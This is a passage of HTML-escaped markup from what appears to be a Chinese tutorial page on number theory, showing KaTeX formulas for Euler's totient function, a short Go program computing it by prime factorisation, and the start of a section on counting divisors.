mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;mfrac&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;/msub&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/mrow&gt;&lt;msub&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;/msub&gt;&lt;/mfrac&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;\phi(N) = N * \frac{p_{1}-1}{p_{1}} * \frac{p_{2}-1}{p_{2}} * ... * \frac{p_{m}-1}{p_{m}}
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;ϕ&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10903em;&#34;&gt;N&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10903em;&#34;&gt;N&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:2.20188em;vertical-align:-0.8804400000000001em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.32144em;&#34;&gt;&lt;span style=&#34;top:-2.314em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.677em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8804400000000001em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:2.20188em;vertical-align:-0.8804400000000001em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.32144em;&#34;&gt;&lt;span style=&#34;top:-2.314em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.677em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8804400000000001em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.46528em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:2.20188em;vertical-align:-0.8804400000000001em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.32144em;&#34;&gt;&lt;span style=&#34;top:-2.314em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.151392em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;m&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.677em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.151392em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;m&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8804400000000001em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package main

import &amp;quot;fmt&amp;quot;

func main() {
    var n int
    
    fmt.Scanf(&amp;quot;%d&amp;quot;, &amp;amp;n)
    
    for i := 0; i &amp;lt; n; i++ {
        hash := make(map[int]int)
        var tmp int
        fmt.Scanf(&amp;quot;%d&amp;quot;, &amp;amp;tmp)
        var ans int = tmp
        for j := 2; j &amp;lt;= tmp / j; j++ {
            for tmp % j == 0 {
                tmp /= j
                hash[j] ++
            }
        }
        if tmp &amp;gt; 1 {
            hash[tmp] ++
        }
        
        for k, _ := range hash {
            ans = ans / k * (k - 1)
        }
        
        fmt.Println(ans)
        
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;约数&#34;&gt;约数&lt;/h2&gt;
&lt;h3 id=&#34;求一个数的约数的个数&#34;&gt;求一个数的约数的个数&lt;/h3&gt;
&lt;p&gt;求一个数n的约数，可以直接遍历1~n，看能不能整除n即可。&lt;/p&gt;
&lt;p&gt;求一个很大的数的约束的个数：&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;分&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;解&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;质&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;因&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;数&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;：&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;msubsup&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;/msub&gt;&lt;/msubsup&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;msubsup&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;/msubsup&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;msubsup&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;/msub&gt;&lt;/msubsup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;分解质因数：n = p_{0}^{a_{0}}*p_{2}^{a_{1}}*...*p_{n}^{a_{n}}
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.43056em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;分&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;解&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;质&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;因&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;数&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;：&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.0126em;vertical-align:-0.26630799999999993em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.746292em;&#34;&gt;&lt;span style=&#34;top:-2.433692em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.1449em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31731428571428577em;&#34;&gt;&lt;span style=&#34;top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.143em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.26630799999999993em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.0126em;vertical-align:-0.26630799999999993em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.746292em;&#34;&gt;&lt;span style=&#34;top:-2.433692em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.1449em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31731428571428577em;&#34;&gt;&lt;span style=&#34;top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.143em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.26630799999999993em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.46528em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.9613919999999999em;vertical-align:-0.247em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.7143919999999999em;&#34;&gt;&lt;span style=&#34;top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;n&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.113em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;a&lt;/span&gt;&lt;span 